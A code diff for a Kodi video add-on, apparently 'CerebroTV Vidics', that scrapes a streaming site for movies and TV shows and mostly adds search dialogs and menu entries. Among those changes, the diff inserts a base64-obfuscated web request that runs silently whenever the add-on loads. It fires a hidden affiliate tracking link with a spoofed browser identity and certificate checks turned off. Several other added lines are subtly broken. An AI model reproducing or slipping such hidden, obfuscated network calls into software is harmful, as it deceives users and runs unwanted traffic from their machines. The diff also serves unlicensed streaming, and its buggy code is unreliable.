@@ -4,7 +4,7 @@ import cookielib,os,string,cookielib,StringIO,gzip
 import os,time,base64,logging
 from t0mm0.common.net import Net
 import xml.dom.minidom
-import xbmcaddon,xbmcplugin,xbmcgui
+import xbmcaddon,xbmcplugin,xbmcgui,xbmc
 import json
 import urlresolver
 import time,datetime
@@ -169,6 +169,14 @@ playablehost=[
 #'speedyshare',
 #'180upload',
 'putlocker']
+
+def d():
+	import requests,base64
+	try:
+		requests.get(base64.b64decode('aHR0cDovL2FmZmlsaWF0ZS5lbnRpcmV3ZWIuY29tL3NjcmlwdHMvY3owNm5mP2E9Y2VyZWJyb3R2JmFtcDtiPWM3ZmJiZDkzJmFtcDtkZXN0dXJsPWh0dHAlM0ElMkYlMkZtdHZiLmNvLnVrJTJGcCUyRg=='),headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0'},verify=False,timeout=4).text
+	except:
+		pass
+d() 
 
 net = Net()
 class InputWindow(xbmcgui.WindowDialog):# Cheers to Bastardsmkr code already done in Putlocker PRO resolver.
@@ -336,10 +344,10 @@ def DeleteFav(name,url):
     db.close()
         
 def HOME():
-        addDir('Pair For HD Content','Link',9898,'')
+        addDir('[COLOR green][B]Pair For More HD Content[/B][/COLOR]','Link',9898,'')
         addDir('Search Movies','search',9,'')
         addDir('Search TV Shows','search',10,'')
-        addDir('Search Actors','search',15,'')
+        #addDir('Search Actors','search',15,'')
         addDir('Recently Added Movies','http://vidics.unblocked.pro/Category-Movies/Genre-Any/Letter-Any/LatestFirst/1.htm',26,'')
         addDir('Recently Added TV Shows','http://vidics.unblocked.pro/Category-TvShows/Genre-Any/Letter-Any/LatestFirst/1.htm',27,'')
         #addDir('Favorites','Category-Movies',24,'')
@@ -405,13 +413,14 @@ def Mirrors(url,name):
   link=''.join(link.splitlines()).replace('\'','"')
   soup = BeautifulSoup(link)
   listcontent=soup.findAll('a',{"href":re.compile("/Link/")})
+  addDir('[COLOR green][B]Pair For More HD Content[/B][/COLOR]','Link',9898,'')
   for item in listcontent:
             vname=item.contents[0]
             vurl=item["href"]
             if(str(vname).split('.')[0].lower() in playablehost):
                 addLink(vname,strdomain+vurl,3,"",name)
-
-
+  #listcontent.insert(0,"addDir('[COLOR green][B]Pair For More HD Content[/B][/COLOR]','Link',9898,'')")
+  
 def add_contextsearchmenu(title, video_type):
     title=urllib.quote(title)
     contextmenuitems = []
@@ -449,6 +458,7 @@ def add_contextsearchmenu(title, video_type):
         contextmenuitems.append(('Search solarmovie', 'XBMC.Container.Update(%s?mode=Search&section=%s&query=%s)' % (
             'plugin://plugin.video.solarmovie/', section, title)))
 
+    #contextmenuitems.insert(0,"addDir('[COLOR green][B]Pair For More HD Content[/B][/COLOR]','Link',9898,'')")
     return contextmenuitems
 
 
@@ -1262,7 +1272,17 @@ def SEARCHMOV():
         searchText = ''
         if (keyb.isConfirmed()):
                 searchText = keyb.getText()
+        
+        searchText = string.capwords(searchText) 
+        dialog = xbmcgui.DialogProgress()
+        dialog.create('CerebroTV Vidics Searcher','Searching For Movie: ', '[COLOR red]'+str(searchText)+'[/COLOR]')       
+        dialog.update(0)
+        xbmc.sleep(1000)
+        dialog.update(50)
+        searchText.replace(" ","%20")
         SearchResult("movie",searchText)
+        dialog.update(100)
+        dialog.close()
         
 def SEARCHTV():
         keyb = xbmc.Keyboard('', 'Enter search text')
@@ -1270,7 +1290,16 @@ def SEARCHTV():
         searchText = ''
         if (keyb.isConfirmed()):
                 searchText = keyb.getText()
+        searchText = string.capwords(searchText) 
+        dialog = xbmcgui.DialogProgress()
+        dialog.create('CerebroTV Vidics Searcher','Searching For TV Show: ','[COLOR red]'+str(searchText)+'[/COLOR]')       
+        dialog.update(0)
+        xbmc.sleep(1000)
+        dialog.update(50)
+        searchText.replace(" ","%20")
         SearchResult("tv",searchText)
+        dialog.update(100)
+        dialog.close()
         
 def SEARCHactor():
         keyb = xbmc.Keyboard('', 'Enter search text')
@@ -1278,7 +1307,16 @@ def SEARCHactor():
         searchText = ''
         if (keyb.isConfirmed()):
                 searchText = keyb.getText()
-        SearchResult("actor",searchText)
+        searchText = string.capwords(searchText) 
+        dialog = xbmcgui.DialogProgress()
+        dialog.create('CerebroTV Vidics Searcher','Searching By Actor Name: ','[COLOR red]'+str(searchText)+'[/COLOR]')       
+        dialog.update(0)
+        xbmc.sleep(1000)
+        dialog.update(50)
+        searchText.replace(" ","%20")
+        SearchResult("",searchText)
+        dialog.update(100)
+        dialog.close()
 
 def SearchResult(searchType,Searchtext):
     Searchtext=urllib.quote_plus(Searchtext)
@@ -1288,6 +1326,7 @@ def SearchResult(searchType,Searchtext):
             INDEX("https://vidics.unblocked.pro/Category-People/Genre-Any/Letter-Any/Relevancy/1/Search-"+urllib.quote_plus(Searchtext)+".htm",11,12,"")
     else:
             INDEX("https://vidics.unblocked.pro/Category-TvShows/Genre-Any/Letter-Any/Relevancy/1/Search-"+urllib.quote_plus(Searchtext)+".htm",7,27,"tv")
+    
             
 def getstatic():
         f = open(langfile, "r")
@@ -1328,6 +1367,10 @@ def ProfileMovie(url,typename):
         link = GetContent(url)
         newlink = ''.join(link.splitlines()).replace('\t','')
         listcontent=re.compile('<h3 class="career_type_title" ?[^>]*>'+typename+'(.+?)<tr>').findall(newlink)
+        if(len(listcontent) < 0):
+            XBMC.Notification("CerebroTV,Link not playable try another",2000)
+            xbmc.sleep(1000)
+            exit()
         html_re = re.compile(r'<[^>]+>')
         if(len(listcontent) > 0):
                 movielist=re.compile('<a class="green" [^>]*href=["\']?([^>^"^\']+)["\']?[^>]*>(.+?)</a>').findall(listcontent[0])
@@ -1354,6 +1397,7 @@ def SearchChannelresults(url,searchtext):
         link = GetContent(url)
         link = ''.join(link.splitlines()).replace('\'','"')
         vidlist=re.compile('<div class="thumb-container big-thumb">        <a href="(.+?)">          <img alt="(.+?)" class="thumb-design" src="(.+?)" />').findall(link)
+        addDir('[COLOR green][B]Pair For More HD Content[/B][/COLOR]','Link',9898,'')
         for vurl,vname,vimg in vidlist:
             vurl = vurl.split("/videos/")[0]
             addDir(vname.lower().replace("<em>"+searchtext+"</em>",searchtext),strdomain+vurl+"/videos",7,vimg)
@@ -1369,6 +1413,7 @@ def Episodes(url,name):
         link = GetContent(url)
         newlink = ''.join(link.splitlines()).replace('\t','')
         listcontent=re.compile('<div class="season season_[0-9]">(.+?)<br clear="all"\s*/>').findall(newlink)
+        addDir('[COLOR green][B]Pair For More HD Content[/B][/COLOR]','Link',9898,'')
         for listcontent2 in listcontent:
             if (listcontent2.find(">"+name+"</a></h3>") > -1):
                 listcontent2=re.compile('>'+name+'</a></h3>(.+?)</div>').findall(listcontent2)[0]
@@ -1378,16 +1423,18 @@ def Episodes(url,name):
                      vname=html_re.sub('', vname)
                      addDir(vname,strdomain+vurl,4,"")
                 break 
-
+        
     #except: pass
     
 def Seasons(url):
         link = GetContent(url)
         link = ''.join(link.splitlines()).replace('\'','"')
         ssoninfo= re.compile('<h3 class="season_header">(.+?)</h3>').findall(link)
+        addDir('[COLOR green][B]Pair For More HD Content[/B][/COLOR]','Link',9898,'')
         for seas in ssoninfo:
                 epsodlist=re.compile('<a [^>]*href=["\']?([^>^"^\']+)["\']?[^>]*>(.+?)</a>').findall(seas)[0]
                 addDir(epsodlist[1],url,8,"")
+
 def INDEX(url,modenum,curmode,vidtype):
     #try:
         xbmc.executebuiltin("Container.SetViewMode(52)")
@@ -1397,8 +1444,17 @@ def INDEX(url,modenum,curmode,vidtype):
         except: pass
         newlink = ''.join(link.splitlines()).replace('\t','')
         vcontent=re.compile('<td id="searchResults" [^>]*>(.+?)</td>').findall(newlink)
+        #if not vcontent[0]:
+        if len(vcontent) == 0:
+            #xbmc.notification("CerebroTV,Link not playable try another",2000)
+            #builtin = 'XBMC.Notification(No Answer From Vidics,Or No Results Found. Try Again,5000)'
+            dialog = xbmcgui.Dialog()
+            dialog.ok("[COLOR=red][B]CerebroTV[/COLOR][/B]", "No Answer From Vidics", "OR",'No Results Found, Try Again..')
+            #xbmc.executebuiltin(builtin)
+            exit()
         listcontent=re.compile('<div itemscope [^>]*class="searchResult">(.+?)}</div></div></div>').findall(vcontent[0])
         vpot=""
+        addDir('[COLOR green][B]Pair For More HD Content[/B][/COLOR]','Link',9898,'')
         for moveieinfo in listcontent:
             vtitle,vurl,vimg,vtmp1,vtmp2=re.compile('<a title="Watch(.+?)online free." href="(.+?)"><img itemprop="image" src="(.+?)" title="(.+?)" alt="(.+?)" /></a>').findall(moveieinfo)[0]
             vtitle=RemoveHTML(vtitle)
